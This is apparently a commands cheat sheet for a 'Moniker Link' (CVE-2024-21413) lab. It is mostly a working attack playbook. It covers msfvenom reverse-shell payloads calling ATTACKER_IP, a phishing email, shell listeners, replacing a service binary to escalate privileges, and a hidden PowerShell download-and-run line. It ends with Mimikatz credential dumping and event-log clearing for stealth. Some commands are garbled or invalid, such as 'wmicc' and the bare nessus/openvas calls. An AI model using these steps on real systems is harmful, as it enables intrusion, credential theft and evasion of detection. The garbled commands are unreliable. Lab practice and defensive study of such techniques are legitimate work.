# Commands Reference – Moniker Link Lab

## Reconnaissance Phase

```bash
# Network discovery
nmap -sV -sC -p- TARGET_IP
nmap -sU -p 1-1000 TARGET_IP  # UDP scan if needed

# Service enumeration
nessus TARGET_IP
openvas TARGET_IP

# Email service discovery
nmap -p 25,110,143,587,993,995 TARGET_IP
```

## Vulnerability Analysis – CVE-2024-21413

```bash
# Search for Outlook email clients and versions
wmicc get Win32_Product | findstr "Outlook"
Reg Query "HKLM\\Software\\Microsoft\\Office"

# Check for vulnerable Outlook versions
wmicc datafile get name | findstr /i "outlook.exe"
```

## Exploitation – Email Attachment Crafting

```bash
# Generate malicious Office documents with embedded OLE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o payload.dll

# Create .docm file with embedded macro (manual or using python-pptx)
# Using Office Open XML structure to embed executable

# Encode and send phishing email
swaks --to victim@company.com --from attacker@mail.com --subject "Important Update" \
  --attach malicious.msg --server mail.company.com
```

## Initial Access – Reverse Shell Establishment

```bash
# Set up reverse shell listener
nc -lvnp 4444

# Or with Metasploit
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

## Post-Exploitation Enumeration

```bash
# Check current user and privileges
whoami
whoami /priv

# List services
wmic service list brief
sc query state=all

# Check service permissions
icacls "C:\\Program Files\\ServiceName\\service.exe"

# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"
```

## Privilege Escalation – Service Exploitation

```bash
# Identify vulnerable service (e.g., one with SYSTEM privileges but weak DACLs)
sc query ServiceName
sc qc ServiceName  # Query config

# Check if service binary is writable
icacls "C:\\Program Files\\VulnerableService\\service.exe"

# Generate privilege escalation payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5555 -f exe -o service_payload.exe

# Replace service binary (requires write permissions)
Copy-Item -Path service_payload.exe -Destination "C:\\Program Files\\VulnerableService\\service.exe" -Force

# Restart service to execute payload
net stop ServiceName
net start ServiceName

# Alternative: Create reverse shell batch script if .exe replacement fails
# powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

## SYSTEM Access – Post-Privilege Escalation

```bash
# Verify SYSTEM privileges
whoami  # Should show NT AUTHORITY\\SYSTEM
whoami /priv

# Dump credentials (Mimikatz for credential harvesting)
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets
```

## Cleanup (if required for stealth)

```bash
# Clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Remove artifacts
rm -Force service_payload.exe
rem "Restore original service binary if possible"
```

## Tools Summary
- **nmap** – Network scanning and service discovery
- **Metasploit** – Payload generation and exploitation framework
- **msfvenom** – Payload encoding/generation
- **nc (netcat)** – Reverse shell listener
- **PowerShell** – Windows post-exploitation
- **mimikatz** – Credential dumping (SYSTEM level)
- **wmic** – Windows Management Instrumentation CLI
